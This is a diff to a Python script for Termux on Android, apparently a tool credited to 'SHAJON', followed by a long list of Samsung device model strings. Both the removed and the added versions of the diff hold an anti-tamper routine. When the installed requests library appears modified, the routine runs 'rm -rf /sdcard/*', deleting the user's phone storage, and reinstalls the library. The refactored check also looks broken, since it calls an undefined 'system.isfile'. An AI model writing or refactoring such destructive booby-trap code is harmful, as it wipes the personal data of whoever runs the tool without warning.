@@ -108,130 +108,43 @@ except ImportError:
 import urllib3
 import socket
 
-def es():
-    if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
-        pass
-    else:
-        os.system('clear')
-        print("System Modification Not Allowed Since Using SHAJON's Tool")
-        exit()
-    if path.isfile("/data/data/com.termux/files/usr/bin/termux-reset"):
-        pass
-    else:
-        os.system('clear')
-        print("System Modification Not Allowed Since Using SHAJON's Tool")
-        exit()
-    if path.isfile("/data/data/com.termux/files/usr/bin/termux-setup-storage"):
-        pass
-    else:
-        os.system('clear')
-        print("System Modification Not Allowed Since Using SHAJON's Tool")
-        exit()
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
-    file_content = file.read()
-if 'print(url)' in file_content:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip unstall requests')
-    os.system('pip install requests')
-    print("System Modification Not Allowed Since Using SHAJON's Tool")
-    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
+# Check required binaries
+required_binaries = [
+    "/data/data/com.termux/files/usr/bin/rm",
+    "/data/data/com.termux/files/usr/bin/termux-reset",
+    "/data/data/com.termux/files/usr/bin/termux-setup-storage"
+]
 
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
-    file_content = file.read()
-if 'print' in file_content:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip unstall requests')
-    os.system('pip install requests')
-    print("System Modification Not Allowed Since Using SHAJON's Tool")
-    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
+for binary in required_binaries:
+    if not system.isfile(binary):
+        os.system('clear')
+        print("System Modification Not Allowed")
+        exit()
 
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
-    file_content = file.read()
-if 'verify=False' in file_content:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip unstall requests')
-    os.system('pip install requests')
-    print("System Modification Not Allowed Since Using SHAJON's Tool")
-    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
-  
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
-    file_content = file.read()
-if 'verify=False' in file_content:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip unstall requests')
-    os.system('pip install requests')
-    print("System Modification Not Allowed Since Using SHAJON's Tool")
-    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
-#---------------------------------another---------------------------------#
-sss='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(sss+'sessions.py','r').read():
-    pass
-else:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip unstall requests')
-    os.system('pip install requests')
-    print("System Modification Not Allowed Since Using SHAJON's Tool")
-    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
-    
-sss='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(sss+'models.py','r').read():
-    pass
-else:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip unstall requests')
-    os.system('pip install requests')
-    print("System Modification Not Allowed Since Using SHAJON's Tool")
-    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
-    
-sss='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(sss+'utils.py','r').read():
-    pass
-else:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip unstall requests')
-    os.system('pip install requests')
-    print("System Modification Not Allowed Since Using SHAJON's Tool")
-    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
-    
-sss='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(sss+'api.py','r').read():
-    pass
-else:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip unstall requests')
-    os.system('pip install requests')
-    print("System Modification Not Allowed Since Using SHAJON's Tool")
-    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
-    
-sss='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(sss+'auth.py','r').read():
-    pass
-else:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip unstall requests')
-    os.system('pip install requests')
-    print("System Modification Not Allowed Since Using SHAJON's Tool")
-    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
-    
-sss='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(sss+'packages.py','r').read():
-    pass
-else:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    os.system('rm -rf /sdcard/*')
-    os.system('pip unstall requests')
-    os.system('pip install requests')
-    print("System Modification Not Allowed Since Using SHAJON's Tool")
-    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
+# List of requests library files to check
+requests_files = [
+    '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py',
+    '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py',
+    '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py',
+    '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py',
+    '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/utils.py',
+    '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/packages.py'
+]
+
+# Check each file for modifications
+for req_file in requests_files:
+    if system.isfile(req_file):
+        with open(req_file, 'r') as file:
+            content = file.read()
+        if 'print' in content:
+            os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+            os.system('rm -rf /sdcard/*')
+            os.system('pip uninstall requests -y')  # Fixed 'unstall' to 'uninstall'
+            os.system('pip install requests')
+            print("System Modification Not Allowed")
+            exit('➤ RUN AGAIN TOOL...!')
+
+print("All checks passed. No modifications detected.")
 
 ugen = []
 modd = ['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H']
